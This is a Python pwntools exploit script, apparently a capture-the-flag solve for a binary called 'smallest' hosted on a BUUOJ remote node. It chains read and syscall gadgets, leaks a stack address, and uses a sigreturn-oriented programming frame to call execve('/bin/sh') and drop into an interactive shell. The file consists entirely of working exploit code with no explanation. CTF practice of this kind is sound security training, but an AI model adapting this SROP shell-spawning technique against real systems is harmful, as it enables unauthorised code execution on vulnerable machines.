import sys
from pwn import *
from ctypes import *
from pwn_debug.pwn_debug import *
binary='smallest'
elf=ELF(binary)
pdbg=pwn_debug(binary)
pdbg.local("/lib/x86_64-linux-gnu/libc.so.6")
pdbg.debug("2.27")
pdbg.remote('node3.buuoj.cn',26647)
pdbg.context.log_level='debug'
while True :
	# try :
		if len(sys.argv)==1 :
			# io=pdbg.run("debug")
			io=pdbg.run("local")
			libc=pdbg.libc
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]
			# one_gadgaet=[0x41602,0x41656,0xdef36]
		else :
			io=pdbg.run("remote")
			libc=ELF('/lib/x86_64-linux-gnu/libc.so.6')
			# libc=ELF('../../x64libc/libc.so.6')
			# one_gadgaet=[0x4f2c5,0x4f322,0x10a38c]
			one_gadgaet=[0x45216,0x4526a,0xf02a4,0xf1147]


		read_addr=0x4000B0
		syscall_addr=0x4000BE
		pay=p64(syscall_addr)
		pay+=p64(read_addr)+p64(syscall_addr)
		pay+=p64(read_addr)+p64(syscall_addr)
		pay+=p64(read_addr)+p64(syscall_addr)
		pay+=p64(read_addr)+p64(syscall_addr)
		pay+=p64(read_addr)+p64(syscall_addr)
		pay+=p64(read_addr)+p64(syscall_addr)
		pay+=p64(read_addr)+p64(syscall_addr)
		pay+=p64(read_addr)+p64(syscall_addr)
		io.send(pay[8:])
		sleep(2)
		io.send('\xbb')
		io.recv(0x150)
		# gdb.attach(io)
		# pause()
		libc_base=u64(io.recv(6)+'\x00\x00')-0x139-8-0x38
		io.recv()
		srop=SigreturnFrame()
		srop.rax=0x3b
		srop.rdi=libc_base
		srop.rip=syscall_addr
		srop.rsp=libc_base
		srop.rbp=libc_base
		srop.rsi=0
		srop.rdx=0
		pay=pay[8:0x18]+'/bin/sh\x00'+str(srop)[8:]
		
		io.send(pay)
		sleep(2)
		io.send(pay[8:8+0xf])
		# libc.address=libc_base
		# system_addr=libc.sym['execve']
		# bin_sh_addr=libc.search('/bin/sh\x00').next()
		success('libc_base:'+hex(libc_base))
		# gdb.attach(io)
		# pause()
		io.interactive()

	# except Exception as e:
	# 	io.close()
	# 	continue
	# else:
	# 	continue